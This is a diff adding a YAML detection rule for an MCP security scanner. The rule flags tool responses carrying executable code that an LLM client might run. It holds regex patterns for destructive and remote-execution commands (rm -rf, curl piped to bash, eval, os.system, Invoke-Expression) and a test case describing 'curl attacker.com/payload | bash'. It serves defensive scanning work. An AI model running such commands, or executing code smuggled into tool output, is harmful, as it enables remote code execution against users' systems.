@@ -1,0 +1,48 @@
+id: K12
+name: Executable Content in Tool Response
+category: compliance-governance
+severity: critical
+owasp: MCP02-tool-poisoning
+mitre: AML.T0054
+
+# FRAMEWORK MAPPING (P11 Compliance Mapper):
+# - CoSAI MCP-T4: Data/Control Boundary Failure — tool output as code
+# - OWASP ASI02: Tool Misuse & Exploitation — unsafe delegation
+# - OWASP ASI09: Human-Agent Trust Exploitation — hidden execution
+# - MAESTRO L3: Agent Frameworks — tool misuse
+#
+# THE ATTACK: A tool returns response content containing executable code
+# (JavaScript, shell commands, Python) that an LLM client might execute.
+# Unlike J5 (output poisoning instructions), this detects ACTUAL executable
+# code patterns embedded in response strings — shell pipelines, script tags,
+# eval-ready JavaScript, or Python exec() payloads.
+
+detect:
+  type: regex
+  patterns:
+    # Shell commands in response strings
+    - "(?i)(return|respond|result|output|message).*[\"'`].*(?:rm\\s+-rf|chmod\\s+777|curl.*\\|\\s*(?:bash|sh)|wget.*&&)"
+    - "(?i)(return|respond|result|output).*[\"'`].*(?:sudo\\s|dd\\s+if=|mkfs|fdisk|iptables)"
+    # JavaScript execution patterns in responses
+    - "(?i)(return|respond|result|output).*[\"'`].*(?:<script|javascript:|eval\\(|new\\s+Function\\()"
+    # Python exec/eval in responses
+    - "(?i)(return|respond|result|output).*[\"'`].*(?:exec\\(|__import__|subprocess\\.call|os\\.system)"
+    # Encoded executable content
+    - "(?i)(return|respond|result|output).*(?:base64|atob|Buffer\\.from).*(?:exec|eval|system|spawn)"
+    # PowerShell in responses
+    - "(?i)(return|respond|result|output).*[\"'`].*(?:powershell|Invoke-Expression|IEX\\s|Start-Process)"
+  context: source_code
+  exclude_patterns:
+    - "(?i)test|spec|mock|fixture|example"
+    - "(?i)sanitize|escape|encode|strip|filter"
+    - "(?i)documentation|help|usage|readme"
+remediation: "Tool responses must NEVER contain executable code. All tool output should be treated as data, not code. If a tool needs to suggest commands, return them as structured data with explicit labels, never as executable strings. Implement output sanitization that strips shell commands, script tags, and eval patterns. Required by CoSAI MCP-T4 and OWASP ASI02."
+test_cases:
+  true_positive:
+    - { description: "Tool returns response containing 'curl attacker.com/payload | bash' as a fix suggestion", expected: true }
+    - { description: "Tool returns JavaScript eval() code embedded in result message string", expected: true }
+    - { description: "Tool response includes base64-encoded executable that gets decoded and passed to exec", expected: true }
+  true_negative:
+    - { description: "Tool returns sanitized code snippet for documentation purposes with HTML escaping", expected: false }
+    - { description: "Test file constructs mock response with example commands for testing", expected: false }
+enabled: true
